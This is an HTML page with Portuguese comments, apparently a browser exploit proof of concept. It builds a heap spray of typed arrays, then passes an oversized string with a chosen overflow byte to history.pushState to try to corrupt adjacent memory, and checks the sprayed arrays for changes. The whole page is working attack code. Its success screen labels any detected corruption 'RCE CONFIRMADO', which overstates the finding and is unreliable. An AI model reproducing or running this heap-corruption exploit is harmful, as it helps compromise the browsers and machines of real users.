<!DOCTYPE html>
<html>
<head>
    <title>The Wall: No-Hole Strategy</title>
    <style>
        body { background: #000; color: #fff; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #333; height: 350px; overflow-y: scroll; padding: 10px; background: #111; color: #ccc; margin-bottom: 15px;}
        button { 
            padding: 20px; width: 100%; font-size: 20px; font-weight: bold; 
            cursor: pointer; border: 2px solid #fff; 
            background: #000; color: #fff; transition: 0.2s;
        }
        button:hover { background: #fff; color: #000; }
        .success { background: #0f0; color: #000; padding: 10px; font-size: 24px; text-align: center; }
        .input-group { margin-bottom: 20px; border: 1px solid #444; padding: 10px; }
    </style>
</head>
<body>
    <h1>THE WALL (NO HOLE)</h1>
    <p>Base: 709522 | Estratégia: Spray Contíguo</p>
    
    <div class="input-group">
        Byte de Overflow (Hex): <input type="text" id="ovByte" value="00" style="font-size:20px; width:50px; text-align:center;">
    </div>

    <button onclick="runNoHole()">INICIAR SPRAY & PAYLOAD</button>

    <div id="logger" class="log">Pronto. Sem buracos desta vez.</div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709522; 
        const MAGIC_NUM = 0x41414141;
        
        // Aumentei o Spray para garantir que o Heap esteja uniforme
        const SPRAY_SIZE = 15000; 

        var spray = [];

        function log(msg) {
            const d = document.createElement('div');
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runNoHole() {
            let byteHex = document.getElementById('ovByte').value;
            let byteVal = parseInt(byteHex, 16);

            log("---------------------------------------");
            log(`INICIANDO. Overflow Byte: 0x${byteHex}`);

            // 1. Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 400));
            spray = [];

            // 2. SPRAY MASSIVO (A Grande Muralha)
            // Alocamos tudo de uma vez para deixar a memória "tijolo com tijolo"
            log(`Construindo muralha de ${SPRAY_SIZE} objetos...`);
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i; 
                spray.push(arr);
            }

            // Delay curto para o GC respirar, mas SEM abrir buracos
            log("Estabilizando...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                // 3. O PAYLOAD
                // Como não tem buraco, o sistema vai colocar isso no final do Heap
                // ou em uma nova página adjacente ao último array.
                log(`Injetando Payload (Base ${BASE_SIZE} + Byte 0x${byteHex})...`);
                
                let base = new Array(BASE_SIZE + 1).join('A');
                let overflow = String.fromCharCode(byteVal); 
                
                // Payload Total
                let payload = base + overflow;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                // 4. CHECAGEM
                // Verificamos TUDO, especialmente os últimos arrays criados
                checkCorruption();

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }

        function checkCorruption() {
            log("Verificando integridade da muralha...");
            let found = false;
            
            // Verifica do final para o começo (mais provável estar lá)
            for(let i = spray.length - 1; i >= 0; i--) {
                let arr = spray[i];
                if(arr) {
                    // LENGTH CHANGE
                    if(arr.length !== 1024) {
                        found = true;
                        reportSuccess(i, "LENGTH", arr.length);
                        return;
                    }

                    // DATA CHANGE
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        reportSuccess(i, "DATA", `0x${arr[0].toString(16)}`);
                        return;
                    }
                }
            }
            if(!found) log("Nenhuma corrupção encontrada. A muralha resistiu.");
        }

        function reportSuccess(idx, type, val) {
            document.body.innerHTML = `<div class='success'><h1>RCE CONFIRMADO</h1><h2>Index: ${idx}</h2><h2>${type}: ${val}</h2></div>`;
            alert(`SUCESSO!\nIndex: ${idx}\n${type}: ${val}`);
        }
    </script>
</body>
</html>
